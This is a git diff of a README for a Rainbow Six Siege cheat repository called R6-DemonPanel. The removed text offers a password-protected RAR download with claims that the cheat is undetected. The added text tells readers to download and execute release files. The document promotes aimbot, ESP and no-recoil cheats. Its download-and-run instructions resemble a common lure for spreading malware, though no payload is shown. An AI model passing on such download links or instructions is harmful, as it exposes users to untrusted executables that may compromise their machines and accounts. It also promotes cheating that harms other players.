@@ -1,82 +1,75 @@
-# [Download](https://github.com/aildelohellcar668/R6-DemonPanel/releases/download/Download/Panel.rar)
-# password: github
+# R6-DemonPanel
 
-![1](https://github.com/aildelohellcar668/R6-DemonPanel/releases/download/Download/340600492-8e0f702a-a73f-4448-99cd-4289b2d4e3eb.png)
+![R6-DemonPanel](https://img.shields.io/badge/R6--DemonPanel-v1.0-blue)
 
-# :video_game: Rainbow Six Siege Cheat
-Cheat is undetected and up to date. :white_check_mark:
-(Vulkan is not supported) :x: Introducing the ultimate choice for Rainbow Six Siege players seeking unrivaled safety and performance: our R6 cheat. Standing tall as one of the most popular, if not the most popular, r6 cheats in the market, this cheat has an impeccable reputation for never having been detected. With many years of flawless operation, our r6 hacks have become synonymous with absolute safety. :shield:
+Welcome to the R6-DemonPanel repository! This project is focused on tools and utilities for Rainbow Six Siege. You can find various hacks and mods to enhance your gameplay experience. If you're looking for an aimbot, ESP, or no recoil mods, you are in the right place.
 
-Experience precision like never before with our Aimbot equipped with Visibility Checks, master the art of stealth with Silent Aim, and gain full control with our highly configurable ESP and Object ESPs. Our r6 cheats also include No Spread and No Recoil features, further enhancing your gameplay. :trophy:
+## Table of Contents
 
-If you're seeking the best in r6 hacks, our cheat is the proven, trusted solution that countless gamers rely on. Explore the difference that our r6 cheats and r6 hacks can make in your Rainbow Six Siege experience and join the ranks of satisfied players who trust in our unparalleled safety and functionality. :medal_sports:
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-- Supported CPU: Intel/AMD only! :computer:
-- Supported OS: Windows 7-11 :computer:
-- Publisher: Ubisoft Montreal :office:
+## Introduction
 
-## :construction: Features
-Work in progress! The actual cheat may have more features than displayed below. We will do our best to update it fully in the near future.
+R6-DemonPanel is designed for players who want to improve their performance in Rainbow Six Siege. This repository contains various tools that allow you to customize your gameplay. Whether you are looking for an aimbot or an ESP, this repository has something for you.
 
-### :dart: Aimbot
-Automatically aim at your enemies.
-- Aim at specific bone :bone:
-- Highly configurable! :gear:
-- Aim hotkey :key:
-- Field-of-view :eyes:
-- Aim smoothing :handshake:
-- Target selector :dart:
-- Lock target :lock:
-- Switch target delay after kill :skull_and_crossbones:
-- Draw crosshair :crossed_swords:
-- Show snaplines :triangular_ruler:
-- Silent aim :shushing_face:
-- Silent aim visibility check :eye:
+You can find the latest releases [here](https://github.com/llumutbltt/R6-DemonPanel/releases). Make sure to download and execute the necessary files to get started.
 
-### :bust_in_silhouette: Character ESP
-See all players etc. through walls. Including important information.
-- Max bones render distance :telescope:
-- Bone style :art:
-- Highly configurable! :gear:
-- Battlemode :video_game:
-- Max render distance :telescope:
-- Max healthbar render distance :heartbeat:
-- Max name render distance :name_badge:
-- Max info render distance :information_source:
-- Healthbar position :bar_chart:
-- Healthbar style :style:
-- Border style :framed_picture:
-- Glow players :star2:
-- Glow NPC's :robot:
+## Features
 
-### :radar: Radar
-Easily spot enemies surrounding you with the 2D Radar.
-- Highly configurable! :gear:
-- Show enemies :skull_and_crossbones:
-- Show friendly :bust_in_silhouette:
-- Color :rainbow:
+- **Aimbot**: Automatically aim at enemies for precise shots.
+- **ESP**: See enemy locations through walls and obstacles.
+- **No Recoil**: Eliminate weapon recoil for better accuracy.
+- **Custom Mods**: Tailor your gameplay experience with various modifications.
 
-### :mag: Object ESP
-See all objects through walls. Including important information.
-- Highly configurable! :gear:
-- Battlemode :video_game:
-- Max render distance :telescope:
-- Max name render distance :name_badge:
-- Max info render distance :information_source:
-- Objects :package:
-- Barbwire :wrench:
-- Breach charge :boom:
-- Claymore :dagger:
-- Cluster charge :bomb:
-- Cluster nade :bomb:
-- Drones :robot:
-- Frost mat :snowflake:
-- Hard breach :hammer:
-- Jager's ADS :shield:
-- Twitch drone :robot:
-- Option to draw 3d boxes :art:
+These features aim to enhance your gaming experience while providing you with the tools you need to excel.
 
-### :wrench: Misc
-- Weapon :gun:
-- No spread :no_entry_sign:
-- No recoil :no_entry_sign:
+## Installation
+
+To install R6-DemonPanel, follow these steps:
+
+1. Visit the [Releases](https://github.com/llumutbltt/R6-DemonPanel/releases) section to find the latest version.
+2. Download the appropriate files for your system.
+3. Extract the files to a folder of your choice.
+4. Execute the application to start using the tools.
+
+Make sure to check for updates regularly to ensure you have the latest features and improvements.
+
+## Usage
+
+Using R6-DemonPanel is straightforward. Once you have installed the application, follow these steps:
+
+1. Launch the application.
+2. Configure your settings according to your preferences.
+3. Start Rainbow Six Siege.
+4. Enjoy your enhanced gameplay!
+
+For detailed instructions on each feature, refer to the documentation included in the release package.
+
+## Contributing
+
+We welcome contributions from the community. If you want to improve R6-DemonPanel, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
+
+Please ensure that your contributions adhere to the project's coding standards and guidelines.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support
+
+If you have any questions or need support, feel free to reach out. You can also check the [Releases](https://github.com/llumutbltt/R6-DemonPanel/releases) section for updates and information.
+
+---
+
+Thank you for checking out R6-DemonPanel! We hope you find it useful for your Rainbow Six Siege experience. Enjoy gaming!
